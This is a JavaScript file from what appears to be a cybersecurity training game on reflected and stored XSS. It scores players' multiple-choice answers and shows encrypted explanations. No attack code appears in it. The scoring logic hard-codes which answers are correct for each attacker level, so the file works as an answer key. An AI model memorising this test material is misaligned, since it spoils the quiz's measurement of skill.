            document.getElementById("defenderRoleCompletedBadge").style.opacity = "100%";
            document.getElementById("defenderRoleCompletedBadgeMini").style.opacity = "100%";
            awardedBadgeId = 1;
            playerRolesPlayed = playerRolesPlayed.concat("Defender,");
            openPlayerStatsZone("Defender-Completed");


        }
        if (LastPlayedRole == "User") {

            document.getElementById("labelPlayerRoleUser").style.visibility = "hidden";
            document.getElementById("playerRoleavatar2").style.visibility = "hidden";
            document.getElementById("userRoleCompletedBadge").style.opacity = "100%";
            document.getElementById("userRoleCompletedBadgeMini").style.opacity = "100%";
            awardedBadgeId = 2;
            playerRolesPlayed = playerRolesPlayed.concat("User,");
            openPlayerStatsZone("User-Completed");

        }



        if (rolesPlayed.includes('Attacker') && rolesPlayed.includes('Defender') && rolesPlayed.includes('User')) {

            showPostGameQuestionnaireUI();
        }


    }


}




function startTimer() {
    timerElement = document.getElementById('levelTimer');


    timeLimitInSeconds++;

}


function closeTimer() {
    clearInterval(timerInterval);
}


function selectAnswerTile(answerTileId) {



    switch (answerTileId) {
        case 1:

            questionTile1Selected = ~questionTile1Selected;
            if (questionTile1Selected) {
                if (playMusic == true) {
                    document.getElementById('buttonSelectSound').play();
                }

                if (tileLocations[0] == 1) {
                    document.getElementById("question1Tile").setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;border:0.4vw solid #0df27e;border-radius: 1vw;");
                } else if (tileLocations[0] == 2) {
                    document.getElementById("question1Tile").setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;border:0.4vw solid #0df27e;border-radius: 1vw;");

                } else if (tileLocations[0] == 3) {
                    document.getElementById("question1Tile").setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;border:0.4vw solid #0df27e;border-radius: 1vw;");

                } else if (tileLocations[0] == 4) {
                    document.getElementById("question1Tile").setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;border:0.4vw solid #0df27e;border-radius: 1vw;");

                }
            } else if (!questionTile1Selected) {
                if (playMusic == true) {
                    document.getElementById('buttonSelectSound').play();
                }

                if (tileLocations[0] == 1) {
                    document.getElementById("question1Tile").setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");
                } else if (tileLocations[0] == 2) {
                    document.getElementById("question1Tile").setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;border:o.2vw solid rgb(255, 255, 255);border-radius: 1vw;");

                } else if (tileLocations[0] == 3) {
                    document.getElementById("question1Tile").setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                } else if (tileLocations[0] == 4) {
                    document.getElementById("question1Tile").setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                }
            }



            break;
        case 2:

            questionTile2Selected = ~questionTile2Selected;
            if (questionTile2Selected) {
                if (playMusic == true) {
                    document.getElementById('buttonSelectSound').play();
                }
                if (tileLocations[1] == 1) {
                    document.getElementById("question2Tile").setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;border:0.4vw solid #0df27e;border-radius: 1vw;");
                } else if (tileLocations[1] == 2) {
                    document.getElementById("question2Tile").setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;border:0.4vw solid #0df27e;border-radius: 1vw;");

                } else if (tileLocations[1] == 3) {
                    document.getElementById("question2Tile").setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;border:0.4vw solid #0df27e;border-radius: 1vw;");

                } else if (tileLocations[1] == 4) {
                    document.getElementById("question2Tile").setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;border:0.4vw solid #0df27e;border-radius: 1vw;");

                }
            } else if (!questionTile2Selected) {
                if (playMusic == true) {
                    document.getElementById('buttonSelectSound').play();
                }
                if (tileLocations[1] == 1) {
                    document.getElementById("question2Tile").setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");
                } else if (tileLocations[1] == 2) {
                    document.getElementById("question2Tile").setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                } else if (tileLocations[1] == 3) {
                    document.getElementById("question2Tile").setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                } else if (tileLocations[1] == 4) {
                    document.getElementById("question2Tile").setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                }
            }


            break;
        case 3:

            questionTile3Selected = ~questionTile3Selected;
            if (questionTile3Selected) {
                if (playMusic == true) {
                    document.getElementById('buttonSelectSound').play();
                }
                if (tileLocations[2] == 1) {
                    document.getElementById("question3Tile").setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;border:0.4vw solid #0df27e;border-radius: 1vw;");
                } else if (tileLocations[2] == 2) {
                    document.getElementById("question3Tile").setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;border:0.4vw solid #0df27e;border-radius: 1vw;");

                } else if (tileLocations[2] == 3) {
                    document.getElementById("question3Tile").setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;border:0.4vw solid #0df27e;border-radius: 1vw;");

                } else if (tileLocations[2] == 4) {
                    document.getElementById("question3Tile").setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;border:0.4vw solid #0df27e;border-radius: 1vw;");

                }
            } else if (!questionTile3Selected) {
                if (playMusic == true) {
                    document.getElementById('buttonSelectSound').play();
                }
                if (tileLocations[2] == 1) {
                    document.getElementById("question3Tile").setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");
                } else if (tileLocations[2] == 2) {
                    document.getElementById("question3Tile").setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                } else if (tileLocations[2] == 3) {
                    document.getElementById("question3Tile").setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                } else if (tileLocations[2] == 4) {
                    document.getElementById("question3Tile").setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                }
            }


            break;

        case 4:

            questionTile4Selected = ~questionTile4Selected;
            if (questionTile4Selected) {
                if (playMusic == true) {
                    document.getElementById('buttonSelectSound').play();
                }
                if (tileLocations[3] == 1) {
                    document.getElementById("question4Tile").setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;border:0.4vw solid #0df27e;border-radius: 1vw;");
                } else if (tileLocations[3] == 2) {
                    document.getElementById("question4Tile").setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;border:0.4vw solid #0df27e;border-radius: 1vw;");

                } else if (tileLocations[3] == 3) {
                    document.getElementById("question4Tile").setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;border:0.4vw solid #0df27e;border-radius: 1vw;");

                } else if (tileLocations[3] == 4) {
                    document.getElementById("question4Tile").setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;border:0.4vw solid #0df27e;border-radius: 1vw;");

                }
            } else if (!questionTile4Selected) {
                if (playMusic == true) {
                    document.getElementById('buttonSelectSound').play();
                }
                if (tileLocations[3] == 1) {
                    document.getElementById("question4Tile").setAttribute("style", "position:fixed;left:1.5%;background-color: #41521F;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");
                } else if (tileLocations[3] == 2) {
                    document.getElementById("question4Tile").setAttribute("style", "position:fixed;left:26%;background-color: #6564DB;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                } else if (tileLocations[3] == 3) {
                    document.getElementById("question4Tile").setAttribute("style", "position:fixed;left:50.5%;background-color: #FF7F11;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                } else if (tileLocations[3] == 4) {
                    document.getElementById("question4Tile").setAttribute("style", "position:fixed;left:75%;background-color: #FF1B1C;border:0.4vw solid rgb(255, 255, 255);border-radius: 1vw;");

                }
            }


            break;


    }

}



function submitQuestionAnswers() {
    playerScore = document.getElementById('playerScoreInGame');
    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    if (!questionTile1Selected && !questionTile2Selected && !questionTile3Selected && !questionTile4Selected) {
        if (playMusic == true) {
            document.getElementById('buttonErrorSound').play();
        }
        $('div#emptyAnswerErrorPopUp1').show();
    } else if (roleId == 0 && (currentLevelNo == 1 || currentLevelNo == 200)) {
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19k0m+uuyqAxuDM08c0rsl6eyPRmoyFTdgIPiyWbLRCk7JpLdEwY9sH", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[1]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19ef8FkLzKtbQF/ZsEzZedrweEmR5HNlBh85Egm9bwoYT62eG/29bAUZVtG5OsmdextuzpW7qs2VIJU3+BAGlNsb2f87767VP4cgbY65sv7QGJHZDR3LVkrtn4B7n+3p+kxflgL6x7tDSHYJBbuiQU0MciJsN5wuiyUFKw2zujkQS8hiRT/jZdv0yasNnmDuuss65/QFR9b+WI4HT8hTG8DiWEf3GRREkvnwUDnrGa4ZKpKFZkaPDovz4LbvjkOQJvIMsS7xjj6IcAslFnjvk110zbY94HliEJ1NWMwPc9L8jgrdaS9MTXrNPbFB0fLO3G63FlJJhTEcg==", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19igt1Cwga9Blc7Rv0uKPmCOSViY28CJMoeMpdRQE5wblVBRtgPEKM9", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19Hbev5qOQBV5DIAyzW3neX8F155Hfccw7DUwRPlkYIAU75PT9TmcdKk1mRM7htfUTnJU6e50ibWsbW9BgL6damK0gaCWaFpqIHotej1FUvRHzJmatQY1gCRtR7jaNMPStrWiqUZyXM4XvTQFYKYOjFyWnZwfaGTdLXxqSCdXXgFJElCb4l+XoN4/7A9wUMZNs97YYjScAsclvYYjzLoK9HL3Au4UO5zhgYpq0qzME6oHP7oMN1q3bX56YgKP60sxvr8YpErRSuvg==", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:0,Level:1");
        currentLevelNo = 2;

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            correctAttackerAnswersList.push("R0L1Q1A2");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            correctAttackerAnswersList.push("R0L1Q1A4");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            incorrectAttackerAnswersList.push("R0L1Q1A1");

            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue - 2;
            AttackerStoredSkillsValue = AttackerStoredSkillsValue - 2;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;
            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;


            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }

            if (AttackerReflectedSkillsValue < 0) {
                AttackerReflectedSkillsValue = 0;
            }

            if (AttackerStoredSkillsValue < 0) {
                AttackerStoredSkillsValue = 0;
            }
            incorrectAttackerAnswersList.push("R0L1Q1A3");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;
        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;
        levelsCompleted.push("R0L1");

    } else if (roleId == 0 && currentLevelNo == 2) {
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+cgtuToqpGd9OOWJdTlHSX8aBVKiK2Pydo9H1RS/ueo3n+Ay7vWq8n", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19pv/qyWodj+3+D5Nod2dWRM2VzOPc+yluC0Lg2eEgAxTW22PtUvUcRTpSzsipxAgeZX7gzlkVYu9z3jBIxrHXvIh0PG/Fd/sj87i6ENq20jTBZK1Jsx7JgEG43O1FPpwK7KFEbBTx/VJOG2zNv5dPjnuHDgvPNHdVNU0CDi+owjAeM+mFVlOnXy8XOBkop0NQhKfKIpFoglxT3KnFU7N2OVeNWKVPVCzFWnf3Tw1ChjfK9sY66PDnVJ+/JrmwtlttNXcoAjxZLfErdM38ZgN6owbHvHvZipjr9RZQcM0VPKmWwCFIxAtIRzwKwfzoPIOJieiNDu2z764GnoFQ33SYhIxaTVIHBbE+Pr8BUcOEmFIStTAa2jRPCxrecqVUJtMozIlKxPA6ZDZv63pvQH9ZoR/MURjTJj2dAx5pSdCwy+8Jq04f6+npjQ3uwPtUOdVXqZMAJrAasuOIix/G4cUxmeCtUzxLjhkZO+/pbcyFjN6smq70kZIvNh7EdcEw9pXkW+SUiT/rB3Jp6PmAV5g0XV/Aei8TK76AGdXZM2rB0RfKQMwCtwS3D", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/TeXT8LOdwFfrAe5/vP7433ONc5pclzx6iwKrbrUWE93dqEIv88xjf", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX18+sl4MNuYYgF9ogr3cbFMb7BA5dICZYaiLmfD+wb87hr1KXbI8xbK0wzhfjfWyx62xnvW/cnz875fyWkz/kY5GV5OJCo7PDNU=", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:0,Level:2");
        currentLevelNo = 3;

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            correctAttackerAnswersList.push("R0L2Q1A1");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            correctAttackerAnswersList.push("R0L2Q1A2");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            correctAttackerAnswersList.push("R0L2Q1A3");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            incorrectAttackerAnswersList.push("R0L2Q1A4");


            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue - 2;

            if (AttackerReflectedSkillsValue < 0) {
                AttackerReflectedSkillsValue = 0;
            }


            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;



            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }


            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }
        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;
        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;
        levelsCompleted.push("R0L2");
    } else if (roleId == 0 && currentLevelNo == 3) {
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19UnSloyBIy/ca/IaVg784//TBeBI4a9D4kC2IK0wTAcXAYWaixSmCp", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + ',' + String(tileLocations[2]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+XoXNAvsxaXktpoCq70lw5T2mwhHasCkhUvJ8Ow7hjBdoGVHtd3l/ClcOA3dE3lrml8HP8PfcdGH5j//A0Z1luF1AkLjjJ9FnaioIOgUEk4DZTMCZ08WEmCG9O226nEPdzOWjBLp/LvhJFkEHGTip2iDI4riSgjK+JuOo8Ox5jabXXxCW0TiJKxY5xddLd1RlVzazitW6XJ2AQ/I5OTDNn1IxkBAKuoEentswNiTZa2Ygl/OZRnzdZ+jPkka/KR8/61/ivqHy1qQ==", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").style.color = "white";
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19sXQjvyMOhRgqipgTqXpTFs525hGbfkpPwPVDpd98vj2Zgo/RN5fodxiGZeKqIEdAKIO0Lys8Nd9P/1A5mWKmy+hEYZy5GdHM2Zs8/ZO2cFniMrPc49n/rp4KEDTPCe03oF7e3bJeCjAJ5vjlWQ/7PdVetcHniFrnxlti4pWJBuULkFcAVytw5MKlWbOEe9iWQSkgnZelgyWD4PI8j7HkVYn+VHzhYgCw=", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19SZyyvXaZZRq/KYuXDpbreb4dxm8xJxlafMFQw8RbohoeOWbhcxxMyepOkjw/DJce90qhVgcLnq0l1AA2NnSB5VzBFpaQWyFBK3PiFj0Ib8IripX0QmkZHSfzoahb7wiWMcruQOmtbY6OQ4Zmx3Li7yeVbmPfV8sdpe4xYtEDpinCxY+yjI8nsc79a9TrIGJBzNxTQWC87zwjBnCLrpPrBVb6ubUszVaYu/CGzogOwMZiMn+PbdvmR", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:0,Level:3");
        currentLevelNo = 4;

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            correctAttackerAnswersList.push("R0L3Q1A1");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            correctAttackerAnswersList.push("R0L3Q1A2");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            correctAttackerAnswersList.push("R0L3Q1A3");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue + attackerRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            correctAttackerAnswersList.push("R0L3Q1A4");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;
        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;
        levelsCompleted.push("R0L3");
    } else if (roleId == 0 && currentLevelNo == 4) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+fpUqYbeG5w6T4H3RpjvOcQihrvPvYlfv8OycSB3B6eNjrExoxadpp", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[2]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+rjqLGwqJYoJNNPta4PhIqFVJ/zBDtYF6PHQA0kPHKnGV9LQX77khbt1s/xTiinaRGI/3w+mb1eGs7RT0vVbXjF/ZcsB3zUqUKStjRfvZ4hPnFTSKJrwnVqSefcP42Bmmka8tu0rvV6QW8nW6pw4xByIfx4SVQLtP91iZSLgyy4MuTgUj1bIyvrVQ8a/9b7clqeHZ8TX1pjfvqViDge+9NpWQ8ZC0+VDLJ1bB0YhMokqnB41x2j/W8oKZvdnHCexhGvIjqe9bkGnGlLVqvFXrSWrbbb6gknwP8D9Aoukji4muxcwrVD37ZhuwTSckU+FCpiAphyW/kOJqkhgoEfMJOvkNIOxrODJG46gokKarMNwbWPwFZgKhP", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19S0ioCtk4hNGgjaXNeOB6l80OORdIr+grLaw9gl+6zDW2b6Svx1/9q", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19atLuaP1EvafzIfsEF83FNVoQ3SHLX+j7ynccDM7Fuwecw7QzBi0FXkMsOCFa/PS0flai6bXBaeH8R0K49zZLHLF10ckc7rU6f7Kw26lMYxLMXj3656kqPcpiLya819jl8qw/NN44y2E0f7Wx1+H3kCuWdbgxPOX3ZZuyK1vpZTM9t+cXIyKxWZHdv0uY7eVotM3uzXTr/gpBuN9lsqJoh7WNNz1SJnNP2T4hp4ctp2qpstx5Ovx4N", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:0,Level:4");
        currentLevelNo = 5;

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            AttackerStoredSkillsValue = AttackerStoredSkillsValue + attackerStoredOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;
            correctAttackerAnswersList.push("R0L4Q1A3");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            AttackerStoredSkillsValue = AttackerStoredSkillsValue + attackerStoredOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;
            correctAttackerAnswersList.push("R0L4Q1A4");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            incorrectAttackerAnswersList.push("R0L4Q1A1");
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            incorrectAttackerAnswersList.push("R0L4Q1A2");

            AttackerReflectedSkillsValue = AttackerReflectedSkillsValue - 2;
            AttackerStoredSkillsValue = AttackerStoredSkillsValue - 2;
            if (AttackerReflectedSkillsValue < 0) {
                AttackerReflectedSkillsValue = 0;
            }

            if (AttackerStoredSkillsValue < 0) {
                AttackerStoredSkillsValue = 0;
            }


            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;
            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;


            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }
            if (!suggestedRoleList.includes("Attacker")) {
                suggestedRoleList.push("Attacker");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;

        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;
        levelsCompleted.push("R0L4");
    } else if (roleId == 0 && currentLevelNo == 5) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+W6FvJ0R6Z26ifHtG8A5XvRXh1QX0Ot4NxmSVWoW2U14LGeL480sG0", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + ',' + String(tileLocations[2]) + '.';
